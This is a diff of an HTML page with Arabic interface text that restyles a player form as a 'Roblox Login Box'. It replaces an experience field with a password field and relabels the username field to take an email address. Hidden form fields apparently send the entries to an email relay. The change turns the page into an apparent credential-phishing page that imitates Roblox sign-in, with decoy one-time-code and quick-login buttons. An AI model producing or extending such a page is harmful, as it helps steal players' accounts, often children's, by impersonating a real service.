@@ -45,63 +45,75 @@ body{
   align-items:center;
 }
 
-/* ===== Login Box ===== */
+/* ===== Roblox Login Box ===== */
 .box{
-  background:rgba(35,38,47,0.95);
+  background:#2b2f36;
   width:380px;
-  padding:25px;
-  border-radius:16px;
-  box-shadow:0 0 25px rgba(0,0,0,0.6);
+  padding:28px;
+  border-radius:14px;
 }
-.box h2{text-align:center;}
+
+.box h2{
+  text-align:center;
+  font-size:22px;
+  margin-bottom:18px;
+}
 
 .box input{
   width:100%;
-  padding:12px;
-  margin:10px 0;
-  border:none;
+  padding:14px;
+  margin:12px 0;
   border-radius:10px;
-  background:#2f3340;
-  color:#ffffff;
-  font-size:16px;
+  border:1px solid #555;
+  background:#1f2329;
+  color:white;
+  font-size:15px;
 }
-.box input::placeholder{color:#bbbbbb;}
+
+.box input::placeholder{color:#aaa;}
+
+.mainbtn{
+  width:100%;
+  padding:14px;
+  border-radius:10px;
+  border:1px solid #ccc;
+  background:transparent;
+  color:white;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+.mainbtn:hover{background:#3a3f46;}
 
 .line{height:1px;background:#444;margin:15px 0;}
 
-/* Roblox Buttons */
-.rb-btn{
+.altbtn{
   width:100%;
   padding:12px;
   border-radius:10px;
-  font-size:16px;
-  font-weight:700;
-  cursor:pointer;
   border:none;
-  transition:0.2s;
-}
-
-.rb-login{
-  background:linear-gradient(#3aa0ff,#1f6bff);
+  background:#3a3f46;
   color:white;
+  font-weight:600;
+  margin-top:10px;
+  cursor:pointer;
 }
-.rb-login:hover{filter:brightness(1.15);}
 
-.rb-google{
-  background:#111;
-  color:white;
-  border:1px solid #555;
+.altbtn:hover{filter:brightness(1.1);}
+
+.small{
+  text-align:center;
+  margin-top:14px;
+  font-size:13px;
+  color:#ccc;
 }
-.rb-google:hover{background:#1a1a1a;}
-
-.rb-signup{
-  background:#2f3340;
-  color:#ddd;
-  border:1px solid #555;
+.link{
+  text-align:center;
+  font-size:13px;
+  color:#9db4ff;
+  margin:12px 0;
+  cursor:pointer;
 }
-.rb-signup:hover{background:#3a3f50;color:white;}
-
-.small{text-align:center;font-size:13px;color:#ccc;margin-top:12px;}
 </style>
 </head>
 
@@ -132,18 +144,20 @@ body{
       <input type="hidden" name="_subject" value="تسجيل لاعب جديد">
       <input type="hidden" name="_template" value="table">
 
-      <input type="text" name="Player_Name" placeholder="اسم المستخدم" required>
-      <input type="text" name="Player_Experience" placeholder="خبراتك في اللعبة" required>
+      <input type="text" name="Player_Name" placeholder="اسم المستخدم/البريد الإلكتروني" required>
+      <input type="password" name="Player_Password" placeholder="كلمة المرور" required>
 
-      <button type="submit" class="rb-btn rb-login">تسجيل الدخول</button>
+      <button type="submit" class="mainbtn">تسجيل الدخول</button>
     </form>
+
+    <div class="link">نسيت كلمة المرور أو اسم المستخدم؟</div>
 
     <div class="line"></div>
 
-    <button class="rb-btn rb-google">تسجيل بواسطة Google</button>
-    <button class="rb-btn rb-signup" style="margin-top:10px;">إنشاء حساب جديد</button>
+    <button class="altbtn">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
+    <button class="altbtn">تسجيل دخول سريع</button>
 
-    <div class="small">ليس لديك حساب؟ أنشئ حساب الآن</div>
+    <div class="small">ليس لديك حساب؟ اشترك</div>
   </div>
 </div>
 
